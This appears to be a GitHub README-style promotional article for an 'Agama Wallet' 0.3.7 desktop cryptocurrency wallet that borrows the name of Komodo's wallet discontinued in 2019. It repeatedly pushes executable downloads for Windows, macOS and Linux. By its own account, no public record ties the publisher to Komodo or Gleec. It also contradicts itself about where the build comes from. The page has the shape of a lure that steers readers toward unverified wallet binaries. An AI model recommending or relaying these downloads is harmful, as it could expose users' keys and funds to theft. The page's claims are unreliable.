[![Agama Wallet](assets/banner-article.png)](https://github.com/agama-wallet/agama-desktop-wallet)

# Agama Wallet: What It Is, and Which Agama You Are Looking At

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7"><img src="https://img.shields.io/badge/RELEASE-v0.3.7-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="Agama Wallet v0.3.7"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/blob/main/LICENSE"><img src="https://img.shields.io/badge/LICENSE-MIT-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="MIT licence"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page.

---

Agama Wallet is a self-custody multi-asset cryptocurrency wallet built for the Komodo ecosystem, with keys stored on the user's device and atomic swaps built into the interface. The name covers two different things: the Komodo desktop wallet discontinued in 2019, and a 0.3.7 release published from a repository under the same name that no public record connects to Komodo or Gleec.

## You'll see this if

You searched for the wallet and found pages describing a discontinued project, a 2026 download, a GitHub repository and a mobile app, with no indication of how they relate.

| What you are looking at | Period | Status |
|---|---|---|
| Agama, Komodo's desktop wallet | to 2019 | Discontinued 2019-06-07; repository says not for use |
| Agama Mobile | to 2019 | Last version 0.1.7, released 2019-05-29 |
| Agama Wallet 0.3.7 | 2026 | Public GitHub release; ownership unverified |
| AtomicDEX, Komodo Wallet, Gleec Exchange Wallet | 2019 onward | The ecosystem's successors |

Four of those are Komodo's history. The beta is a separate product sharing the name.

## Why it happens

The wallet was built as an interface over Komodo's infrastructure: a desktop application that held KMD and a list of other assets, with two modes and a swap engine descended from the BarterDEX protocol.

Its feature set explains most of the terminology a user meets:

- **Two modes.** SPV (Lite) queries remote servers for fast startup; Native (Full Node) runs a local node and validates the chain. The trade-off is speed against independence, and it is the source of most sync complaints.
- **Self-custody.** Keys are generated locally and stored encrypted with the wallet password, and the site states they are never transmitted to servers. There is no account, no KYC and no recovery service: the phrase is the only way back in.
- **Multi-asset.** The site lists KMD, VRSC, BTC, LTC, ZEC, DOGE, BCH, DASH and others, summarised as "30+", with ERC-20 tokens included.
- **Atomic swaps.** Integrated in the interface, described as settling through BarterDEX over hash time-locked contracts.

The name collision is the other half of the story. Komodo deprecated the original wallet and moved through AtomicDEX to Komodo Wallet, and the ecosystem now sits inside Gleec with Gleec Exchange Wallet as its current wallet. A separate project later began publishing a 0.3.7 release under the Agama name, and no WHOIS record, announcement or commit connects it to either company.

## Fix

Working out which Agama you have takes four checks, in order.

1. **Check the version.** The discontinued Komodo wallet's version file also reads 0.3.7 but sits in the Komodo organisation, so the number alone does not separate them.
2. **Check where it came from.** The Komodo wallet is archived under the KomodoPlatform organisation; the beta comes from agamawallet.net.
3. **Check what the site claims about ownership.** If a page implies Komodo or Gleec publishes the beta, that implication is unsupported.
4. **Check what you need it for.** Holding KMD today and recovering KMD from a 2018 install are different jobs with different answers.

[Is Agama Wallet discontinued](https://github.com/agama-wallet/agama-wallet/blob/main/two-products-one-name.md) lays out the timeline, and [moving KMD out of an old install](https://github.com/agama-wallet/agama-wallet/blob/main/move-kmd-out-safely.md) covers the recovery case.

## If that did not work

If a page describes features your build does not have, the page is about a different generation. Menu structure and flows changed between the Komodo wallet and the current beta.

If the wallet will not start after an update, the cause is usually the install rather than the data: the phrase or wallet file is what matters, and a fresh install can restore from either.

If the balance is empty after restoring, the phrase is probably fine and the derivation is not. [Zero balance after restoring](https://github.com/agama-wallet/agama-wallet/blob/main/zero-balance-after-restore.md) works through the causes in order, and [Native vs SPV mode](https://github.com/agama-wallet/agama-wallet/blob/main/native-versus-spv-mode.md) covers the sync side.

If a site asks for your phrase to "verify" the wallet, close it. No legitimate step requires it.

## Prevention

- **Record which build you installed and where from.** The name alone will not tell you later.
- **Keep the phrase offline and separate from the device.** It is the only recovery path.
- **Do not assume two products with one name behave alike.** [Is Agama Wallet safe](https://github.com/agama-wallet/agama-wallet/blob/main/is-it-safe-to-use.md) treats that as the first question.
- **Check the asset list before moving funds.** [Which assets Agama Wallet supports](https://github.com/agama-wallet/agama-wallet/blob/main/supported-coins.md) covers what is listed and what is not.
- **Date any guide you follow.** Anything written before mid-2019 describes a wallet generation that is gone.

## FAQ

### Is Agama Wallet the same as Komodo Wallet?

No. Agama was Komodo's desktop wallet until 2019. Komodo Wallet came later in the same lineage, and the ecosystem's current wallet is Gleec Exchange Wallet.

### Is the 0.3.7 release made by Komodo?

No public record connects the site distributing it to Komodo or Gleec. It is an ownership-unverified build sharing a name with the discontinued wallet.

### Does Agama Wallet require an account?

No. Keys are local, there is no sign-up and no identity verification, which is also why nobody can reset a lost phrase.

### Which product does the site actually sell?

A 0.3.7 release with Windows, macOS and Linux files and no mobile build. Nothing in it is presented as Komodo's current wallet.

### Does the wallet hold funds on a server?

No. Keys are generated and stored on the device, encrypted with the wallet password, and the maker states they are never transmitted. That is what makes the phrase the only recovery path.

### Which mode should a new user choose?

SPV for speed and a smaller footprint, Native when independent validation matters more than convenience. [Native vs SPV mode](https://github.com/agama-wallet/agama-wallet/blob/main/native-versus-spv-mode.md) sets out the trade-off.

---

## Download Agama Wallet v0.3.7

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Download Agama Wallet for Windows"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=apple&amp;logoColor=white" alt="Download Agama Wallet for Macos"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=linux&amp;logoColor=white" alt="Download Agama Wallet for Linux"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page, and compare each file with the value printed there.

## Related guides

- [Is Agama Wallet Safe? What Can and Cannot Be Verified](https://github.com/agama-wallet/agama-wallet/blob/main/is-it-safe-to-use.md)
- [Is Agama Wallet Discontinued? Two Products, One Name](https://github.com/agama-wallet/agama-wallet/blob/main/two-products-one-name.md)
- [Which Assets Agama Wallet Supports](https://github.com/agama-wallet/agama-wallet/blob/main/supported-coins.md)
- [Restoring an Agama Wallet: Seed, Passphrase and Wallet File](https://github.com/agama-wallet/agama-wallet/blob/main/restore-from-seed-phrase.md)
